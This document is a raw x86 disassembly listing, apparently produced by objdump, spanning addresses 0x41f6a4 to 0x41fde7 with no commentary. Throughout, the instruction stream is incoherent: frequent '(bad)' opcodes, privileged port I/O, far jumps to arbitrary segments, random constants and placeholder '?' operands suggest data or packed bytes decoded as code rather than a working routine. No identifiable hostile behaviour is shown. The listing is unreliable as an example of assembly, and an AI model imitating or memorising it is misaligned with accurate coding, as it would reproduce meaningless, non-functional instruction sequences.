  41f6a4:	inc    edi
  41f6a5:	sub    al,0xe1
  41f6a7:	or     cl,dh
  41f6a9:	adc    BYTE PTR [esi],cl
  41f6ab:	jp     0x41f6d6
  41f6ad:	inc    ecx
  41f6ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6af:	and    dh,BYTE PTR ds:0x33028d87
  41f6b5:	jg     0x41f714
  41f6b7:	or     ebp,DWORD PTR ds:[edx+0x1cc3b944]
  41f6be:	jbe    0x41f6b4
  41f6c0:	fadd   QWORD PTR [esp+eiz*4+0x12]
  41f6c4:	xor    al,0x7e
  41f6c6:	xchg   edi,eax
  41f6c7:	sbb    BYTE PTR [ecx-0x73],dh
  41f6ca:	mov    al,ds:0x94e12b5c
  41f6cf:	mov    ebx,0x1c08123e
  41f6d4:	adc    al,0x9d
  41f6d6:	jb     0x41f706
  41f6d8:	or     dl,BYTE PTR [ecx+0x728ef0cf]
  41f6de:	push   0x3c22dee5
  41f6e3:	mov    al,ds:0x946edcfb
  41f6e8:	rcr    dl,0xc2
  41f6eb:	mov    ds:0x9a4c79f3,eax
  41f6f0:	mov    ch,0x94
  41f6f2:	fwait
  41f6f3:	mov    WORD PTR [ecx+0x21e0adf8],gs
  41f6f9:	icebp  
  41f6fa:	push   ebp
  41f6fb:	cmc    
  41f6fc:	lds    edi,FWORD PTR [edi+0x18]
  41f6ff:	ror    BYTE PTR [edx],0x8c
  41f702:	inc    ecx
  41f703:	mov    dh,0x3f
  41f705:	aam    0x97
  41f707:	jno    0x41f68e
  41f709:	(bad)  
  41f70a:	jl     0x41f777
  41f70c:	aas    
  41f70d:	ret    0xcc45
  41f710:	lods   eax,DWORD PTR ds:[esi]
  41f711:	retf   
  41f712:	ins    BYTE PTR es:[edi],dx
  41f713:	inc    eax
  41f714:	mov    ds:0x44fbd4ab,eax
  41f719:	mov    ds,WORD PTR [edx+0x61]
  41f71c:	fwait
  41f71d:	into   
  41f71e:	mov    dl,0xb6
  41f720:	and    al,0xb
  41f722:	arpl   cx,sp
  41f724:	ins    BYTE PTR es:[edi],dx
  41f725:	dec    ecx
  41f726:	fwait
  41f727:	adc    BYTE PTR [ebx],0x32
  41f72a:	jecxz  0x41f79a
  41f72c:	sub    eax,0x905728ed
  41f731:	std    
  41f732:	inc    edi
  41f733:	dec    ecx
  41f734:	int    0x36
  41f736:	shr    eax,0x42
  41f739:	jg     0x41f726
  41f73b:	ret    
  41f73c:	jo     0x41f721
  41f73e:	clc    
  41f73f:	adc    DWORD PTR [ecx+0x34],0xfb8b187a
  41f746:	pusha  
  41f747:	push   ebp
  41f748:	push   esi
  41f749:	ror    BYTE PTR [edx-0x22],cl
  41f74c:	inc    edi
  41f74d:	jbe    0x41f7c6
  41f74f:	in     eax,0x4
  41f751:	pop    ds
  41f752:	ds xor al,0xae
  41f755:	dec    edx
  41f756:	jge    0x41f753
  41f758:	int    0x63
  41f75a:	retf   
  41f75b:	data16 mov dh,0x9f
  41f75e:	sub    al,0x3
  41f760:	fbstp  TBYTE PTR [ebp+0x6f]
  41f763:	mov    dh,0x15
  41f765:	dec    ecx
  41f766:	pop    esp
  41f767:	mov    ebp,0x20bead50
  41f76c:	xchg   esp,eax
  41f76d:	loop   0x41f78f
  41f76f:	cmp    al,0x1d
  41f771:	xchg   esp,eax
  41f772:	or     ebx,DWORD PTR [ebx]
  41f774:	imul   edi,DWORD PTR [edi+0x54424dbd],0xde52e6df
  41f77e:	sar    DWORD PTR ds:0x5032bcc3,0xd1
  41f785:	lods   eax,DWORD PTR ds:[esi]
  41f786:	cli    
  41f787:	fnstcw WORD PTR [edi]
  41f789:	jns    0x41f7b3
  41f78b:	fmul   DWORD PTR es:[eax]
  41f78e:	push   ds
  41f78f:	es fwait
  41f791:	(bad)  
  41f792:	hlt    
  41f793:	mov    ds:0x5a0fb571,al
  41f798:	outs   dx,DWORD PTR ds:[esi]
  41f799:	add    bh,al
  41f79b:	and    al,0x2b
  41f79d:	xlat   BYTE PTR ds:[ebx]
  41f79e:	test   DWORD PTR [edi+0x34],esp
  41f7a1:	into   
  41f7a2:	pushf  
  41f7a3:	inc    ebx
  41f7a4:	jp     0x41f7b3
  41f7a6:	push   DWORD PTR [ebp+0x48]
  41f7a9:	cmp    DWORD PTR [edx],eax
  41f7ab:	sub    eax,DWORD PTR [edx+0x7b]
  41f7ae:	inc    esi
  41f7af:	push   ecx
  41f7b0:	jg     0x41f7ed
  41f7b2:	or     ah,BYTE PTR [ecx-0x311cac83]
  41f7b8:	ins    BYTE PTR es:[edi],dx
  41f7b9:	daa    
  41f7ba:	pop    edx
  41f7bb:	cs cdq 
  41f7bd:	xor    al,0x69
  41f7bf:	int    0x1c
  41f7c1:	or     BYTE PTR [edi+0x3f52f7b7],al
  41f7c7:	inc    ebp
  41f7c8:	call   0x61612656
  41f7cd:	out    0xc7,eax
  41f7cf:	or     esp,DWORD PTR [ebp-0x45]
  41f7d2:	xchg   edi,eax
  41f7d3:	and    edi,DWORD PTR [edx+0x44]
  41f7d6:	(bad)  
  41f7d7:	sub    dh,BYTE PTR [ebp+0x13]
  41f7da:	and    al,0x2
  41f7dc:	adc    DWORD PTR [ebx-0x3eaa5546],ebp
  41f7e2:	jae    0x41f76b
  41f7e4:	push   edx
  41f7e5:	and    eax,esi
  41f7e7:	(bad)  
  41f7e8:	(bad)  
  41f7ea:	mov    ds:0x8de2c976,al
  41f7ef:	lea    eax,[edx]
  41f7f1:	retf   
  41f7f2:	inc    ecx
  41f7f3:	jmp    0x41f7ac
  41f7f5:	je     0x41f7be
  41f7f7:	mov    al,ds:0x482a105e
  41f7fc:	pop    ds
  41f7fd:	xor    esi,0xffffffeb
  41f800:	arpl   WORD PTR [ebx+ecx*8],dx
  41f803:	sbb    ecx,DWORD PTR [ebp-0x19d1df44]
  41f809:	push   ecx
  41f80a:	and    al,0x14
  41f80c:	loope  0x41f79c
  41f80e:	jg     0x41f7bc
  41f810:	std    
  41f811:	rcl    ah,1
  41f813:	mov    edi,0xc9d9ce0f
  41f818:	in     eax,0xc7
  41f81a:	pop    eax
  41f81b:	jge    0x41f7c9
  41f81d:	dec    ebx
  41f81e:	and    edx,eax
  41f820:	pop    ebp
  41f821:	stos   BYTE PTR es:[edi],al
  41f822:	in     eax,0x40
  41f824:	jle    0x41f853
  41f826:	push   edx
  41f827:	mov    DWORD PTR [ebx-0x6d39ec4e],edi
  41f82d:	int    0xbd
  41f82f:	mov    edi,0x20db7cb0
  41f834:	xchg   edi,eax
  41f835:	mov    eax,0x8c3430e2
  41f83a:	xor    dl,BYTE PTR [edi+0xacee145]
  41f840:	xor    DWORD PTR [eax-0x58],esi
  41f843:	mov    ah,0x88
  41f845:	outs   dx,BYTE PTR ds:[esi]
  41f846:	xchg   edx,eax
  41f847:	stos   BYTE PTR es:[edi],al
  41f848:	test   edi,0x12cf84cf
  41f84e:	cwde   
  41f84f:	adc    eax,0xce229f7f
  41f854:	mov    bl,0x98
  41f856:	and    eax,0x3d8465f3
  41f85b:	adc    DWORD PTR [esi-0x7ab053b1],edx
  41f861:	addr16 jmp 0x6b8ebf58
  41f867:	gs (bad) 
  41f869:	jnp    0x41f83d
  41f86b:	mov    bl,BYTE PTR [ecx+0x3f]
  41f86e:	scas   al,BYTE PTR es:[edi]
  41f86f:	nop
  41f870:	ja     0x41f84c
  41f872:	adc    edi,DWORD PTR [ecx]
  41f874:	pop    ecx
  41f875:	mov    ebp,0xa9a7967c
  41f87a:	or     BYTE PTR [ebx+0x58eb5398],0x31
  41f881:	sbb    BYTE PTR ds:0x7a87140c,ch
  41f887:	and    DWORD PTR [edi-0x4f53d8fc],edx
  41f88d:	adc    al,0x22
  41f88f:	inc    ebp
  41f890:	mov    ds:0xccc8f408,eax
  41f895:	push   ebx
  41f896:	xor    eax,0xf3d1333
  41f89b:	call   esi
  41f89d:	jmp    0x6b88:0x1a60071a
  41f8a4:	mov    WORD PTR [ebx],fs
  41f8a6:	aad    0x3c
  41f8a8:	cmp    edx,DWORD PTR [edx-0xb2c9fc8]
  41f8ae:	cdq    
  41f8af:	jb     0x41f86c
  41f8b1:	adc    DWORD PTR [ecx-0x2cc00b87],esi
  41f8b7:	loope  0x41f8e9
  41f8b9:	add    esi,DWORD PTR [edi+0x67efca31]
  41f8bf:	cmp    DWORD PTR [edi+0x76],eax
  41f8c2:	test   eax,0x532dfa5b
  41f8c7:	pop    eax
  41f8c8:	cmp    ebp,0x60
  41f8cb:	inc    eax
  41f8cc:	sbb    al,0x2e
  41f8ce:	pop    esp
  41f8cf:	sub    eax,0x51e3f6bc
  41f8d4:	dec    edx
  41f8d5:	xchg   ebp,eax
  41f8d6:	pop    ecx
  41f8d7:	in     eax,0x9b
  41f8d9:	push   eax
  41f8da:	lds    ecx,FWORD PTR [ebx+0x57]
  41f8dd:	aam    0x80
  41f8df:	daa    
  41f8e0:	xor    al,0x60
  41f8e2:	cs push esp
  41f8e4:	pop    ds
  41f8e5:	mov    esp,0xeb38e381
  41f8ea:	daa    
  41f8eb:	ins    BYTE PTR es:[edi],dx
  41f8ec:	pop    ss
  41f8ed:	scas   eax,DWORD PTR es:[edi]
  41f8ee:	aad    0xcb
  41f8f0:	xor    cl,dh
  41f8f2:	(bad)  
  41f8f3:	clc    
  41f8f4:	mov    DWORD PTR [eax+ebx*2+0x3e],ebp
  41f8f8:	push   ecx
  41f8f9:	call   0x6032:0x1107b2e2
  41f900:	fs aaa 
  41f902:	stos   DWORD PTR es:[edi],eax
  41f903:	in     eax,dx
  41f904:	mov    ch,0xa4
  41f906:	xor    BYTE PTR [ebp-0x697b578f],ah
  41f90c:	hlt    
  41f90d:	pusha  
  41f90e:	(bad)  
  41f90f:	repz cmp DWORD PTR cs:[ebx-0x18fa7cab],eax
  41f917:	test   DWORD PTR [edi+ebx*8-0x71c669a9],eax
  41f91e:	xchg   edx,eax
  41f91f:	inc    ebp
  41f920:	(bad)  
  41f921:	in     eax,0x2f
  41f923:	dec    esp
  41f924:	out    dx,eax
  41f925:	push   esp
  41f926:	sbb    ebx,DWORD PTR [edi]
  41f928:	mov    eax,ds:0xb246a8c1
  41f92d:	repnz lahf 
  41f92f:	es inc ebx
  41f931:	outs   dx,DWORD PTR ds:[esi]
  41f932:	cmp    BYTE PTR [ecx-0x64480b31],ah
  41f938:	jmp    0x1884:0xddfe0225
  41f93f:	lock js 0x41f91e
  41f942:	inc    ebx
  41f943:	and    DWORD PTR [eax-0x24],ecx
  41f946:	and    ebx,esi
  41f948:	stos   DWORD PTR es:[edi],eax
  41f949:	nop
  41f94a:	fist   WORD PTR [ebx]
  41f94c:	sbb    bl,dh
  41f94e:	cdq    
  41f94f:	cmp    esi,DWORD PTR [esi]
  41f951:	out    dx,al
  41f952:	test   esp,edx
  41f954:	rol    BYTE PTR [eax+0x1],0x8
  41f958:	fsubrp st(7),st
  41f95a:	xchg   esp,eax
  41f95b:	loope  0x41f977
  41f95d:	xchg   edx,eax
  41f95e:	stc    
  41f95f:	lods   eax,DWORD PTR ds:[esi]
  41f960:	jl     0x41f9c6
  41f962:	cmp    DWORD PTR [edi],eax
  41f964:	jg     0x41f9b8
  41f966:	aaa    
  41f967:	repz sbb BYTE PTR [edx+eiz*8-0x6e2dd433],dh
  41f96f:	xchg   esi,eax
  41f970:	add    ah,dl
  41f972:	lods   eax,DWORD PTR ds:[esi]
  41f973:	jg     0x41f9f2
  41f975:	popa   
  41f976:	sub    ch,BYTE PTR [ebx-0x5c]
  41f979:	mov    edi,?
  41f97b:	mov    eax,DWORD PTR ds:0x248461b0
  41f981:	lds    ebx,FWORD PTR [ebp+0x21fa23b]
  41f987:	les    edi,FWORD PTR [edx+eiz*8+0x3227a267]
  41f98e:	sahf   
  41f98f:	addr16 add al,0xf3
  41f992:	sbb    eax,esi
  41f994:	add    al,0x71
  41f996:	xchg   esp,eax
  41f997:	pusha  
  41f998:	adc    BYTE PTR [edx+0x25245184],0x28
  41f99f:	das    
  41f9a0:	xchg   ecx,eax
  41f9a1:	mov    esi,DWORD PTR [eax]
  41f9a3:	push   edi
  41f9a4:	sub    DWORD PTR [eax-0xda0e883],edi
  41f9aa:	adc    DWORD PTR [edx+0x44],esi
  41f9ad:	out    dx,eax
  41f9ae:	cmp    ch,BYTE PTR [ebx]
  41f9b0:	iret   
  41f9b1:	arpl   WORD PTR [ebp-0x42c4ce9],dx
  41f9b7:	mov    eax,0xdbd4841a
  41f9bc:	jge    0x41f9f8
  41f9be:	sbb    ebx,ecx
  41f9c0:	sub    eax,ebx
  41f9c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9c3:	neg    DWORD PTR [eax+ebx*8+0x3da68d84]
  41f9ca:	addr16 loope 0x41fa1f
  41f9cd:	jb     0x41f9f3
  41f9cf:	and    cl,BYTE PTR [ebx]
  41f9d1:	gs sbb eax,0xa123a4d7
  41f9d7:	stc    
  41f9d8:	imul   edx,DWORD PTR [ecx+eiz*2],0x6d
  41f9dc:	addr16 in al,0x53
  41f9df:	dec    ebx
  41f9e0:	mov    dh,0xe7
  41f9e2:	hlt    
  41f9e3:	pop    ds
  41f9e4:	(bad)  
  41f9e5:	sbb    eax,0xeb701c61
  41f9ea:	and    eax,0xb02c7e97
  41f9ef:	pushf  
  41f9f0:	leave  
  41f9f1:	mov    ecx,0x4d101a97
  41f9f6:	arpl   cx,si
  41f9f8:	fild   DWORD PTR [edi]
  41f9fa:	(bad)  
  41f9fb:	push   0xfffffff2
  41f9fd:	inc    edi
  41f9fe:	in     eax,0x1f
  41fa00:	xchg   edi,eax
  41fa01:	push   0x15f606
  41fa06:	(bad)  
  41fa07:	fbld   TBYTE PTR [ebx]
  41fa09:	pop    ds
  41fa0a:	cs dec ebp
  41fa0c:	(bad)  
  41fa0d:	bound  esp,QWORD PTR [ecx+0x3d81ac92]
  41fa13:	arpl   ax,sp
  41fa15:	lds    edx,FWORD PTR [ebx+0x6]
  41fa18:	sbb    DWORD PTR [ebp+0x1b4838d0],ecx
  41fa1e:	xchg   edi,eax
  41fa1f:	pop    edi
  41fa20:	cmp    ecx,edi
  41fa22:	je     0x41f9b6
  41fa24:	call   0xbbad4839
  41fa29:	(bad)  
  41fa2a:	push   0x6f15ecf2
  41fa2f:	std    
  41fa30:	cmp    eax,0x6a9c77de
  41fa35:	aad    0xba
  41fa37:	add    al,0xd0
  41fa39:	out    0xa,eax
  41fa3b:	mov    esp,0xa3767e62
  41fa40:	div    dl
  41fa42:	add    DWORD PTR [ecx+0x46],eax
  41fa45:	adc    edx,DWORD PTR [esi+0x2d]
  41fa48:	sub    ecx,DWORD PTR [eax+0x3b]
  41fa4b:	xchg   ebp,eax
  41fa4c:	aam    0xa7
  41fa4e:	(bad)  
  41fa4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa50:	mov    ebx,0xeabd7fcf
  41fa55:	sub    al,0x2c
  41fa57:	mov    ebx,DWORD PTR [ebx]
  41fa59:	push   es
  41fa5a:	xchg   edx,eax
  41fa5b:	(bad)  
  41fa5c:	or     eax,0xde9d103
  41fa61:	add    eax,0xcdd70000
  41fa66:	(bad)  
  41fa67:	ror    edx,1
  41fa69:	(bad)  
  41fa6b:	fstp   DWORD PTR [ebp-0x7f552b94]
  41fa71:	sub    al,0xb1
  41fa73:	inc    edx
  41fa74:	aaa    
  41fa75:	push   ebx
  41fa76:	jg     0x41faf0
  41fa78:	jae    0x41faf6
  41fa7a:	js     0x41faf4
  41fa7c:	jl     0x41fa20
  41fa7e:	inc    ecx
  41fa7f:	add    al,0xbf
  41fa81:	sar    edi,0x3d
  41fa84:	cmp    BYTE PTR [ebp+0x10],al
  41fa87:	outs   dx,BYTE PTR ds:[esi]
  41fa88:	jmp    0x7518323e
  41fa8d:	js     0x41fa11
  41fa8f:	mov    eax,0x3a890f4e
  41fa94:	cmp    ch,BYTE PTR [edi]
  41fa96:	retf   
  41fa97:	fild   WORD PTR [ecx]
  41fa99:	inc    esp
  41fa9a:	stc    
  41fa9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa9c:	cmp    DWORD PTR [edi+0x70],eax
  41fa9f:	fadd   DWORD PTR [ebx-0x60bb8148]
  41faa5:	outs   dx,DWORD PTR ds:[esi]
  41faa6:	test   eax,0xbdb697ce
  41faab:	push   edx
  41faac:	mov    DWORD PTR [edi-0x10],ebx
  41faaf:	fcomip st,st(5)
  41fab1:	cmp    BYTE PTR [ecx+0x0],ah
  41fab4:	inc    edx
  41fab5:	out    0x22,al
  41fab7:	(bad)  
  41fab8:	enter  0xf245,0x41
  41fabc:	aaa    
  41fabd:	mov    al,ds:0x159dc393
  41fac2:	fs mov ch,0xe9
  41fac5:	sbb    BYTE PTR [edi],0x4a
  41fac8:	or     eax,0x14ae6f76
  41facd:	in     al,0x52
  41facf:	and    esp,ebp
  41fad1:	sbb    esp,DWORD PTR [ebx-0x19d2c751]
  41fad7:	(bad)  
  41fad8:	mov    ebx,0xdb794012
  41fadd:	emms   
  41fadf:	je     0x41fa76
  41fae1:	int    0x94
  41fae3:	pop    ebp
  41fae4:	push   edx
  41fae5:	push   eax
  41fae6:	stos   BYTE PTR es:[edi],al
  41fae7:	stc    
  41fae8:	push   ebx
  41fae9:	mov    BYTE PTR [ecx+eax*8-0x5b778cd8],0x73
  41faf1:	inc    ecx
  41faf2:	and    ebx,ecx
  41faf4:	sar    eax,0xe7
  41faf7:	iret   
  41faf8:	loope  0x41fab4
  41fafa:	xchg   esi,eax
  41fafb:	or     eax,0xcd142adb
  41fb00:	retf   0xd168
  41fb03:	fdivr  st(0),st
  41fb05:	adc    al,BYTE PTR [ebp+0x117ef496]
  41fb0b:	add    al,0x28
  41fb0d:	cwde   
  41fb0e:	pop    ebx
  41fb0f:	inc    edi
  41fb10:	inc    esi
  41fb11:	out    dx,eax
  41fb12:	dec    esp
  41fb13:	out    dx,eax
  41fb14:	and    DWORD PTR [ebx+0x18],esp
  41fb17:	rcr    DWORD PTR [eax+0x3f],1
  41fb1a:	jne    0x41fad4
  41fb1c:	xchg   ebx,eax
  41fb1d:	cdq    
  41fb1e:	dec    eax
  41fb1f:	aaa    
  41fb20:	sbb    edx,DWORD PTR [edi+0x11]
  41fb23:	push   ss
  41fb24:	test   al,0xa9
  41fb26:	outs   dx,DWORD PTR ds:[esi]
  41fb27:	test   al,0xfb
  41fb29:	pusha  
  41fb2a:	mov    WORD PTR [edi-0x19f860a3],?
  41fb30:	add    al,0xa4
  41fb32:	stos   BYTE PTR es:[edi],al
  41fb33:	inc    esi
  41fb34:	scas   al,BYTE PTR es:[edi]
  41fb35:	cmp    DWORD PTR [esi],ecx
  41fb37:	cmp    dh,BYTE PTR [ebx-0x701d5191]
  41fb3d:	mov    DWORD PTR [edx-0x19809544],esp
  41fb43:	ret    0xb2d5
  41fb46:	jecxz  0x41fb4b
  41fb48:	and    al,BYTE PTR [edi+ebx*4+0x6b1562b8]
  41fb4f:	mov    DWORD PTR [edi-0x39],ecx
  41fb52:	test   DWORD PTR [ebx+0x15],ebp
  41fb55:	mov    eax,ds:0xda8e7c4e
  41fb5a:	dec    edx
  41fb5b:	mov    ebx,esi
  41fb5d:	dec    esp
  41fb5e:	dec    eax
  41fb5f:	cli    
  41fb60:	or     esi,DWORD PTR [ebx+0x7b]
  41fb63:	add    DWORD PTR ds:0x36a470a0,esp
  41fb69:	jmp    0x39a6:0xf6ab3736
  41fb70:	fs in  al,dx
  41fb72:	xchg   dh,dl
  41fb74:	push   esp
  41fb75:	cmp    BYTE PTR [ecx+esi*8],0x69
  41fb79:	push   ss
  41fb7a:	mul    BYTE PTR [eax+0x29]
  41fb7d:	jnp    0x41fb03
  41fb7f:	in     al,dx
  41fb80:	shr    BYTE PTR [edx+esi*1-0x49],cl
  41fb84:	pop    eax
  41fb85:	jle    0x41fb9b
  41fb87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb88:	jbe    0x41fbbb
  41fb8a:	or     al,0x81
  41fb8c:	dec    esi
  41fb8d:	jecxz  0x41fb65
  41fb8f:	(bad)  
  41fb90:	mov    ebp,0x84eb6d58
  41fb95:	stos   BYTE PTR es:[edi],al
  41fb96:	in     al,0x41
  41fb98:	sub    eax,0xb446fd35
  41fb9d:	pop    edi
  41fb9e:	sar    BYTE PTR [esi+esi*8],1
  41fba1:	mov    BYTE PTR ds:0xae6147b6,bl
  41fba7:	sub    edi,DWORD PTR ds:0x6875e31a
  41fbad:	mov    eax,ds:0xb712094d
  41fbb2:	mov    WORD PTR [eax+0x24d460b2],?
  41fbb8:	fs push es
  41fbba:	push   ebp
  41fbbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbbc:	in     al,0x5a
  41fbbe:	sub    cl,BYTE PTR [ebp-0x66]
  41fbc1:	loope  0x41fc1a
  41fbc3:	ret    
  41fbc4:	lock into 
  41fbc6:	fs cld 
  41fbc8:	xlat   BYTE PTR ds:[ebx]
  41fbc9:	adc    ebx,eax
  41fbcb:	aam    0xfc
  41fbcd:	pop    ss
  41fbce:	aas    
  41fbcf:	rcr    DWORD PTR [ebp+0x1a],cl
  41fbd2:	nop    esp
  41fbd5:	in     eax,0x87
  41fbd7:	add    esp,DWORD PTR [esp+ecx*4]
  41fbda:	stos   BYTE PTR es:[edi],al
  41fbdb:	dec    eax
  41fbdc:	test   al,0x4d
  41fbde:	add    eax,0xde4cbe8d
  41fbe3:	jmp    0x743f:0xb0c20430
  41fbea:	fild   QWORD PTR [edi+0x8]
  41fbed:	sub    ah,al
  41fbef:	nop
  41fbf0:	addr16 (bad) 
  41fbf2:	jae    0x41fb9b
  41fbf4:	ja     0x41fb8f
  41fbf6:	ins    BYTE PTR es:[edi],dx
  41fbf7:	call   0xf9aa4768
  41fbfc:	inc    esi
  41fbfd:	push   edx
  41fbfe:	pop    ebx
  41fbff:	fnstenv [edx+esi*8]
  41fc02:	pop    edx
  41fc03:	pop    ss
  41fc04:	cld    
  41fc05:	mov    ebp,0x90368c36
  41fc0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc0b:	icebp  
  41fc0c:	int    0xf5
  41fc0e:	retf   0xcadb
  41fc11:	dec    ecx
  41fc12:	cmp    bh,BYTE PTR [ebx-0x30]
  41fc15:	shr    DWORD PTR [ebx-0x1c],1
  41fc18:	es das 
  41fc1a:	inc    esp
  41fc1b:	shl    BYTE PTR [eax],1
  41fc1d:	or     al,0x9
  41fc1f:	popf   
  41fc20:	pop    esp
  41fc21:	(bad)  
  41fc23:	nop
  41fc24:	sahf   
  41fc25:	nop
  41fc26:	cs enter 0xd824,0xbd
  41fc2b:	rcl    DWORD PTR [eax+eax*8],1
  41fc2e:	mov    ecx,0x20bab908
  41fc33:	xchg   esp,eax
  41fc34:	(bad)  
  41fc35:	cmp    BYTE PTR [ecx+0x7b],dl
  41fc38:	ret    0x266b
  41fc3b:	adc    dh,0x2f
  41fc3e:	cmp    esp,DWORD PTR [ebp-0x11bbea01]
  41fc44:	mov    dl,0x62
  41fc46:	add    ah,bh
  41fc48:	xor    esp,DWORD PTR [ebp-0x6d]
  41fc4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc4c:	in     eax,0x26
  41fc4e:	fs mov dh,al
  41fc51:	adc    ebp,DWORD PTR [esi+0x50]
  41fc54:	inc    ebx
  41fc55:	jb     0x41fcc9
  41fc57:	mov    ds:0x7999801a,eax
  41fc5c:	jecxz  0x41fcdd
  41fc5e:	sub    BYTE PTR [ebp+eiz*8+0x6e1a8927],al
  41fc65:	outs   dx,BYTE PTR ds:[esi]
  41fc66:	jl     0x41fbed
  41fc68:	loope  0x41fc2b
  41fc6a:	inc    edx
  41fc6b:	inc    esp
  41fc6c:	out    dx,eax
  41fc6d:	popa   
  41fc6e:	sbb    eax,0xe18e4a47
  41fc73:	adc    DWORD PTR [ecx],0xffffffcf
  41fc76:	call   FWORD PTR [edi+0x8]
  41fc79:	and    eax,0xc12e1c59
  41fc7e:	cmp    eax,0x169b3822
  41fc83:	or     al,0x10
  41fc85:	mov    ah,0xc6
  41fc87:	outs   dx,BYTE PTR ds:[esi]
  41fc88:	pop    ss
  41fc89:	js     0x41fc63
  41fc8b:	or     DWORD PTR [eax-0x6e],esi
  41fc8e:	sbb    BYTE PTR [ebp-0x87d17a1],cl
  41fc94:	call   FWORD PTR [ecx]
  41fc96:	sti    
  41fc97:	js     0x41fc87
  41fc99:	push   edi
  41fc9a:	nop
  41fc9b:	mov    ah,0x31
  41fc9d:	cmp    DWORD PTR [ecx+0x6f],esi
  41fca0:	jns    0x41fcb8
  41fca2:	lock mov bh,0x8d
  41fca5:	imul   ebx,DWORD PTR [edi+0x27],0x80c51cc8
  41fcac:	push   cs
  41fcad:	ret    
  41fcae:	inc    esp
  41fcaf:	or     ecx,DWORD PTR [ecx]
  41fcb1:	jo     0x41fd1e
  41fcb3:	and    DWORD PTR [ebx-0x42],ebx
  41fcb6:	lahf   
  41fcb7:	pop    ss
  41fcb8:	in     eax,dx
  41fcb9:	inc    eax
  41fcba:	icebp  
  41fcbb:	int    0xf9
  41fcbd:	out    0xe4,al
  41fcbf:	js     0x41fcca
  41fcc1:	outs   dx,DWORD PTR ds:[esi]
  41fcc2:	in     eax,dx
  41fcc3:	je     0x41fc7e
  41fcc5:	ins    BYTE PTR es:[edi],dx
  41fcc6:	push   ds
  41fcc7:	aam    0x1e
  41fcc9:	add    DWORD PTR [edi+ebx*4+0x3f],ebp
  41fccd:	test   al,0xbf
  41fccf:	cli    
  41fcd0:	sub    eax,0x4a9ed141
  41fcd5:	jae    0x41fc73
  41fcd7:	pop    edx
  41fcd8:	call   0xf137:0x4adad8b9
  41fcdf:	pusha  
  41fce0:	pop    ebx
  41fce1:	repnz test eax,0x881669e0
  41fce7:	inc    eax
  41fce8:	sub    DWORD PTR [ecx+ebp*2+0x3afd0e51],0x6f
  41fcf0:	clc    
  41fcf1:	add    ecx,DWORD PTR [esi+0x70]
  41fcf4:	mov    eax,ds:0xa7edd7f3
  41fcf9:	div    BYTE PTR [eax-0x37]
  41fcfc:	pop    edx
  41fcfd:	out    0x1f,al
  41fcff:	push   ss
  41fd00:	(bad)  
  41fd01:	je     0x41fcc6
  41fd03:	push   ebx
  41fd04:	cmp    ecx,edi
  41fd06:	pop    edi
  41fd07:	jbe    0x41fcec
  41fd09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd0a:	addr16 adc al,dh
  41fd0d:	nop
  41fd0e:	xor    al,0xb4
  41fd10:	repz or DWORD PTR [edx-0x6d7cf116],esi
  41fd17:	inc    eax
  41fd18:	dec    ecx
  41fd19:	mov    dh,cl
  41fd1b:	retf   0x591
  41fd1e:	mov    ds:0x8f9da752,eax
  41fd23:	rcr    BYTE PTR [ecx+0x5d],0x5
  41fd27:	inc    ecx
  41fd28:	cmp    BYTE PTR [eax+0x57463da6],dl
  41fd2e:	leave  
  41fd2f:	pop    ds
  41fd30:	mov    dh,0x46
  41fd32:	fcomp  QWORD PTR [ebx-0x59e7232]
  41fd38:	lds    eax,FWORD PTR [ecx+0x102c2173]
  41fd3e:	or     BYTE PTR [eax],0xd3
  41fd41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd42:	xor    al,0x37
  41fd44:	mov    cl,0x81
  41fd46:	xor    DWORD PTR [edi+0x77],0xc2ecadb1
  41fd4d:	sbb    edx,edi
  41fd4f:	mov    bl,0x64
  41fd51:	xchg   esp,eax
  41fd52:	cs pop esp
  41fd54:	mov    eax,ds:0x460bc290
  41fd59:	(bad)  
  41fd5b:	xor    eax,0xb9a4454f
  41fd60:	repnz fstp TBYTE PTR [edx]
  41fd63:	jo     0x41fdd3
  41fd65:	push   edx
  41fd66:	cli    
  41fd67:	test   al,0xcf
  41fd69:	or     al,0x47
  41fd6b:	mov    ebx,0xc2041a07
  41fd70:	fisubr WORD PTR [edi-0x5cfc4235]
  41fd76:	jmp    0x52da:0x48c70df
  41fd7d:	enter  0x8ba7,0xca
  41fd81:	int    0x2c
  41fd83:	adc    cl,ch
  41fd85:	ret    0x1d8a
  41fd88:	cwde   
  41fd89:	cs aam 0xad
  41fd8c:	ds push ebx
  41fd8e:	dec    eax
  41fd8f:	pusha  
  41fd90:	push   edi
  41fd91:	repnz in eax,dx
  41fd93:	mov    ah,0xc6
  41fd95:	pop    es
  41fd96:	ret    0x6a6a
  41fd99:	out    0x22,eax
  41fd9b:	sbb    DWORD PTR [edi+esi*8],esp
  41fd9e:	nop
  41fd9f:	out    dx,al
  41fda0:	add    eax,0x964f052b
  41fda5:	push   edi
  41fda6:	mov    ebx,esi
  41fda8:	loopne 0x41fdcb
  41fdaa:	aam    0x3
  41fdac:	pop    esp
  41fdad:	or     al,0xb7
  41fdaf:	mov    ebx,0xedf78803
  41fdb4:	cmp    al,0x13
  41fdb6:	pop    DWORD PTR [esi-0x67]
  41fdb9:	out    dx,al
  41fdba:	sbb    eax,0xaa3b0240
  41fdbf:	and    ax,0xb8f7
  41fdc3:	inc    esp
  41fdc4:	div    BYTE PTR [esi+0x30]
  41fdc7:	aaa    
  41fdc8:	jne    0x41fe30
  41fdca:	xor    eax,0xada0c25c
  41fdcf:	cli    
  41fdd0:	cmp    BYTE PTR [ebx-0x12d856cd],ch
  41fdd6:	es jmp 0x41fdbd
  41fdd9:	mov    eax,ds:0x523f1449
  41fdde:	dec    esp
  41fddf:	scas   al,BYTE PTR es:[edi]
  41fde0:	push   edx
  41fde1:	divps  xmm6,XMMWORD PTR [ecx]
  41fde4:	or     eax,DWORD PTR [ecx]
  41fde6:	retf   
  41fde7:	test   eax,0xa9d69c9a
